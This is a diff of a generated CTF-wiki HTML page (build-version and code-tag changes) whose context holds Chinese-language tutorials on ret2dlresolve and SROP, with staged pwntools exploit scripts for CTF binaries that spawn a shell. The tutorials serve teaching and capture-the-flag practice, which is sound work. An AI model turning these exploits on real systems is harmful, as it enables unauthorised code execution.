@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -5204,8 +5204,8 @@
 <li><a href="https://www.math1as.com/index.php/archives/341/">https://www.math1as.com/index.php/archives/341/</a></li>
 </ol>
 <p>首先我们可以编译下ret2dlresolve文件夹下的源文件main.c文件得到二进制文件，这里取消了Canary保护。</p>
-<div class="codehilite"><pre><span></span>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ gcc main.c -m32 -fno-stack-protector -o main
-</pre></div>
+<div class="codehilite"><pre><span></span><code>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ gcc main.c -m32 -fno-stack-protector -o main
+</code></pre></div>
 
 <p>在下面的讲解过程中，我会按照以两种不同的方法来进行讲解。其中第一种方法比较麻烦，但是可以仔细理解ret2dlresolve的原理，第二种方法则是直接使用已有的工具，相对容易一点。</p>
 <ol>
@@ -5219,7 +5219,7 @@
 </ol>
 <h4 id="_4">正常攻击<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
 <p>显然我们程序有一个很明显的栈溢出漏洞的。这题我们不考虑我们有libc的情况。我们可以很容易的分析出偏移为112。</p>
-<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">create</span> <span class="mi">200</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">create</span> <span class="mi">200</span>
 <span class="err">[+]</span> <span class="nf">Generating</span> <span class="no">a</span> <span class="no">pattern</span> <span class="no">of</span> <span class="mi">200</span> <span class="no">bytes</span>
 <span class="nf">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span>
 <span class="err">[+]</span> <span class="nf">Saved</span> <span class="no">as</span> <span class="err">&#39;</span><span class="no">$_gef0</span><span class="err">&#39;</span>
@@ -5268,7 +5268,7 @@
 <span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">search</span> <span class="mi">0x62616164</span>
 <span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="mi">0x62616164</span><span class="err">&#39;</span>
 <span class="err">[+]</span> <span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">112</span> <span class="p">(</span><span class="no">little-endian</span> <span class="no">search</span><span class="p">)</span> <span class="no">likely</span>
-</pre></div>
+</code></pre></div>
 
 <h5 id="stage-1">stage 1<a class="headerlink" href="#stage-1" title="Permanent link">&para;</a></h5>
 <p>这里我们的主要目的是控制程序执行write函数，虽然我们可以控制程序直接执行write函数。但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到bss段来控制write函数。即主要分为两步</p>
@@ -5277,7 +5277,7 @@
 <li>控制write函数输出相应字符串。</li>
 </ol>
 <p>这里主要使用了pwntools中的ROP模块。具体代码如下</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
@@ -5309,10 +5309,10 @@
 
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>结果如下</p>
-<div class="codehilite"><pre><span></span>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage1.py
+<div class="codehilite"><pre><span></span><code>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage1.py
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;</span>
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -5323,11 +5323,11 @@
 <span class="o">[</span>*<span class="o">]</span> Loaded cached gadgets <span class="k">for</span> <span class="s1">&#39;./main&#39;</span>
 <span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 /bin/sh<span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive
-</pre></div>
+</code></pre></div>
 
 <h5 id="stage-2">stage 2<a class="headerlink" href="#stage-2" title="Permanent link">&para;</a></h5>
 <p>在这一阶段，我们将会利用dlresolve相关的知识来控制程序执行write函数。这里我们主要是利用plt[0]中的相关指令，即push linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得单独提供一个write重定位项在plt表中的偏移。</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
@@ -5369,10 +5369,10 @@
 
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>效果如下，仍然输出了cmd对应的字符串。</p>
-<div class="codehilite"><pre><span></span>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage2.py
+<div class="codehilite"><pre><span></span><code>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage2.py
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;</span>
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -5383,12 +5383,12 @@
 <span class="o">[</span>*<span class="o">]</span> Loaded cached gadgets <span class="k">for</span> <span class="s1">&#39;./main&#39;</span>
 <span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 /bin/sh<span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive
-</pre></div>
+</code></pre></div>
 
 <h5 id="stage-3">stage 3<a class="headerlink" href="#stage-3" title="Permanent link">&para;</a></h5>
 <p>这一次，我们同样控制dl_resolve函数中的index_offset参数，不过这次控制其指向我们伪造的write重定位项。</p>
 <p>鉴于pwntools本身并不支持对重定位表项的信息的获取。这里我们手动看一下</p>
-<div class="codehilite"><pre><span></span>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ readelf -r main
+<div class="codehilite"><pre><span></span><code>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ readelf -r main
 
 重定位节 <span class="s1">&#39;.rel.dyn&#39;</span> 位于偏移量 0x318 含有 <span class="m">3</span> 个条目：
  偏移量     信息    类型              符号值      符号名称
@@ -5403,10 +5403,10 @@
 0804a014  <span class="m">00000407</span> R_386_JUMP_SLOT   <span class="m">00000000</span>   strlen@GLIBC_2.0
 0804a018  <span class="m">00000507</span> R_386_JUMP_SLOT   <span class="m">00000000</span>   __libc_start_main@GLIBC_2.0
 0804a01c  <span class="m">00000607</span> R_386_JUMP_SLOT   <span class="m">00000000</span>   write@GLIBC_2.0
-</pre></div>
+</code></pre></div>
 
 <p>可以看出write的重定表项的r_offset=0x0804a01c，r_info=0x00000607。具体代码如下</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
@@ -5454,10 +5454,10 @@
 
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>最后结果如下，这次我们在bss段伪造了一个假的write的重定位项，仍然输出了对应的字符串。</p>
-<div class="codehilite"><pre><span></span>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage3.py
+<div class="codehilite"><pre><span></span><code>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage3.py
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;</span>
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -5468,11 +5468,11 @@
 <span class="o">[</span>*<span class="o">]</span> Loaded cached gadgets <span class="k">for</span> <span class="s1">&#39;./main&#39;</span>
 <span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 /bin/sh<span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive
-</pre></div>
+</code></pre></div>
 
 <h5 id="stage-4">stage 4<a class="headerlink" href="#stage-4" title="Permanent link">&para;</a></h5>
 <p>stage3中，我们控制了重定位表项，但是重定位表项的内容与write原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的r_info=0x607可以知道，write对应的符号在符号表的下标为0x607&gt;&gt;8=0x6。因此，我们知道write对应的符号地址为0x8048238。</p>
-<div class="codehilite"><pre><span></span>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ objdump -s -EL -j  .dynsym main
+<div class="codehilite"><pre><span></span><code>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ objdump -s -EL -j  .dynsym main
 
 main：     文件格式 elf32-i386
 
@@ -5487,10 +5487,10 @@ Contents of section .dynsym:
  <span class="m">8048248</span> 2c000000 44a00408 <span class="m">04000000</span> 11001a00  ,...D...........
  <span class="m">8048258</span> 0b000000 3c860408 <span class="m">04000000</span> <span class="m">11001000</span>  ....&lt;...........
  <span class="m">8048268</span> 1a000000 40a00408 <span class="m">04000000</span> 11001a00  ....@...........
-</pre></div>
+</code></pre></div>
 
 <p>这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为16个字节。</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
@@ -5554,10 +5554,10 @@ Contents of section .dynsym:
 
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>具体效果如下</p>
-<div class="codehilite"><pre><span></span>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage4.py
+<div class="codehilite"><pre><span></span><code>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage4.py
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;</span>
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -5568,11 +5568,11 @@ Contents of section .dynsym:
 <span class="o">[</span>*<span class="o">]</span> Loaded cached gadgets <span class="k">for</span> <span class="s1">&#39;./main&#39;</span>
 <span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 /bin/sh<span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive
-</pre></div>
+</code></pre></div>
 
 <h5 id="stage-5">stage 5<a class="headerlink" href="#stage-5" title="Permanent link">&para;</a></h5>
 <p>这一阶段，我们将在阶段4的基础上，我们进一步使得write符号的st_name指向我们自己构造的字符串。</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
@@ -5639,10 +5639,10 @@ Contents of section .dynsym:
 
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>效果如下</p>
-<div class="codehilite"><pre><span></span>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage5.py
+<div class="codehilite"><pre><span></span><code>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage5.py
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;</span>
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -5653,11 +5653,11 @@ Contents of section .dynsym:
 <span class="o">[</span>*<span class="o">]</span> Loaded cached gadgets <span class="k">for</span> <span class="s1">&#39;./main&#39;</span>
 <span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 /bin/sh<span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive
-</pre></div>
+</code></pre></div>
 
 <h5 id="stage-6">stage 6<a class="headerlink" href="#stage-6" title="Permanent link">&para;</a></h5>
 <p>这一阶段，我们只需要将原先的write字符串修改为system字符串，同时修改write的参数为system的参数即可获取shell。这是因为，dl_resolve最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
@@ -5726,14 +5726,14 @@ Contents of section .dynsym:
 
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>需要注意的是，这里我'/bin/sh'的偏移我修改为了82，这是因为pwntools中它会自动帮你对齐字符串。。。下面这一行说明了问题。</p>
-<div class="codehilite"><pre><span></span>0x0050:           &#39;aara&#39;
-</pre></div>
+<div class="codehilite"><pre><span></span><code>0x0050:           &#39;aara&#39;
+</code></pre></div>
 
 <p>效果如下</p>
-<div class="codehilite"><pre><span></span>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage6.py
+<div class="codehilite"><pre><span></span><code>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python stage6.py
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;</span>
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -5769,11 +5769,11 @@ Contents of section .dynsym:
 $ ls
 core  main.c     stage2.py  stage4.py  stage6.py
 main  stage1.py  stage3.py  stage5.py
-</pre></div>
+</code></pre></div>
 
 <h4 id="_5">工具攻击<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
 <p>根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用roputil来进行攻击。代码如下</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">roputils</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">roputils</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">process</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">gdb</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">context</span>
@@ -5798,11 +5798,11 @@ main  stage1.py  stage3.py  stage5.py
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>关于dl_resolve_call与dl_resolve_data的具体细节请参考roputils.py的源码，比较容易理解，需要注意的是，dl_resolve执行完之后也是需要有对应的返回地址的。</p>
 <p>效果如下</p>
-<div class="codehilite"><pre><span></span>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python roptool.py
+<div class="codehilite"><pre><span></span><code>➜  ret2dlresolve git:<span class="o">(</span>master<span class="o">)</span> ✗ python roptool.py
 <span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./main&#39;</span>: pid <span class="m">6114</span>
 <span class="o">[</span>DEBUG<span class="o">]</span> Received 0x17 bytes:
     <span class="s1">&#39;Welcome to XDCTF2015~!\n&#39;</span>
@@ -5836,7 +5836,7 @@ $ ls
     <span class="s1">&#39;__init__.py  main.c  roputils.py  stage1.py\tstage3.py  stage5.py\n&#39;</span>
 core         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py
 __init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py
-</pre></div>
+</code></pre></div>
 
 <h3 id="_6">题目<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
 <h2 id="srop">SROP<a class="headerlink" href="#srop" title="Permanent link">&para;</a></h2>
@@ -5859,7 +5859,7 @@ __init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py
 <ul>
 <li>x86</li>
 </ul>
-<div class="codehilite"><pre><span></span><span class="k">struct</span> <span class="n">sigcontext</span>
+<div class="codehilite"><pre><span></span><code><span class="k">struct</span> <span class="n">sigcontext</span>
 <span class="p">{</span>
   <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">gs</span><span class="p">,</span> <span class="n">__gsh</span><span class="p">;</span>
   <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">fs</span><span class="p">,</span> <span class="n">__fsh</span><span class="p">;</span>
@@ -5884,12 +5884,12 @@ __init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py
   <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">oldmask</span><span class="p">;</span>
   <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cr2</span><span class="p">;</span>
 <span class="p">};</span>
-</pre></div>
+</code></pre></div>
 
 <ul>
 <li>x64</li>
 </ul>
-<div class="codehilite"><pre><span></span><span class="k">struct</span> <span class="n">_fpstate</span>
+<div class="codehilite"><pre><span></span><code><span class="k">struct</span> <span class="n">_fpstate</span>
 <span class="p">{</span>
   <span class="cm">/* FPU environment matching the 64-bit FXSAVE layout.  */</span>
   <span class="n">__uint16_t</span>        <span class="n">cwd</span><span class="p">;</span>
@@ -5940,7 +5940,7 @@ __init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py
     <span class="p">};</span>
   <span class="n">__uint64_t</span> <span class="n">__reserved1</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
 <span class="p">};</span>
-</pre></div>
+</code></pre></div>
 
 </li>
 <li>
@@ -5990,24 +5990,24 @@ __init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py
 <h3 id="_11">示例<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
 <p>这里以360春秋杯中的smallest-pwn为例进行简单介绍。基本步骤如下</p>
 <p><strong>确定文件基本信息</strong></p>
-<div class="codehilite"><pre><span></span>➜  smallest file smallest
+<div class="codehilite"><pre><span></span><code>➜  smallest file smallest
 smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
-</pre></div>
+</code></pre></div>
 
 <p>可以看到该程序为64位静态链接版本。</p>
 <p><strong>检查保护</strong></p>
-<div class="codehilite"><pre><span></span>➜  smallest checksec smallest
+<div class="codehilite"><pre><span></span><code>➜  smallest checksec smallest
     Arch:     amd64-64-little
     RELRO:    No RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
-</pre></div>
+</code></pre></div>
 
 <p>程序主要开启了NX保护。</p>
 <p><strong>漏洞发现</strong></p>
 <p>实用IDA直接反编译看了一下，发现程序就几行汇编代码，如下</p>
-<div class="codehilite"><pre><span></span><span class="nf">public</span> <span class="no">start</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">public</span> <span class="no">start</span>
 <span class="nf">start</span> <span class="no">proc</span> <span class="no">near</span>
 <span class="nf">xor</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
 <span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="mi">400</span><span class="no">h</span>
@@ -6016,7 +6016,7 @@ smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
 <span class="nf">syscall</span>
 <span class="nf">retn</span>
 <span class="nf">start</span> <span class="no">endp</span>
-</pre></div>
+</code></pre></div>
 
 <p>根据syscall的编号为0，可以知道该程序执行的指令为read(0,$rsp,400)，即向栈顶读入400个字符。毫无疑问，这个是有栈溢出的。</p>
 <p><strong>利用思路</strong></p>
@@ -6026,7 +6026,7 @@ smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
 <li>通过syscall执行execve("/bin/sh",0,0)来获取shell。</li>
 </ul>
 <p><strong>漏洞利用程序</strong></p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">small</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./smallest&#39;</span><span class="p">)</span>
 <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
@@ -6079,7 +6079,7 @@ smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
 <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sigreturn</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>其基本流程为</p>
 <ul>
@@ -6109,18 +6109,18 @@ smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
 </ul>
 <p>当不同的处理器架构实现了不同的指令时，自然就会出现兼容性问题，所以linux实现了vsyscall接口，在底层会根据具体的结构来进行具体操作。而vsyscall就实现在vdso中。</p>
 <p>这里，我们顺便来看一下vdso，在Linux(kernel 2.6 or upper)中执行ldd /bin/sh, 会发现有个名字叫linux-vdso.so.1(老点的版本是linux-gate.so.1)的动态文件, 而系统中却找不到它, 它就是VDSO。 例如:</p>
-<div class="codehilite"><pre><span></span>➜  ~ ldd /bin/sh
+<div class="codehilite"><pre><span></span><code>➜  ~ ldd /bin/sh
     linux-vdso.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x00007ffd8ebf2000<span class="o">)</span>
     libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f84ff2f9000<span class="o">)</span>
     /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x0000560cae6eb000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>除了快速系统调用，glibc也提供了VDSO的支持, open(), read(), write(), gettimeofday()都可以直接使用VDSO中的实现。使得这些调用速度更快。 内核新特性在不影响glibc的情况下也可以更快的部署。</p>
 <p>这里我们以intel的处理器为例，进行简单说明。</p>
 <p>其中sysenter的参数传递方式与int 0x80一致，但是我们可能需要自己布置好 function prolog（32位为例）</p>
-<div class="codehilite"><pre><span></span><span class="nf">push</span> <span class="no">ebp</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">push</span> <span class="no">ebp</span>
 <span class="nf">mov</span> <span class="no">ebp</span><span class="p">,</span><span class="no">esp</span>
-</pre></div>
+</code></pre></div>
 
 <p>此外，如果我们没有提供functtion prolog的话，我们还需要一个可以进行栈迁移的gadgets，以便于可以改变栈的位置。</p>
 <h3 id="_13">原理<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
@@ -6238,7 +6238,7 @@ smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -6253,7 +6253,7 @@ smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
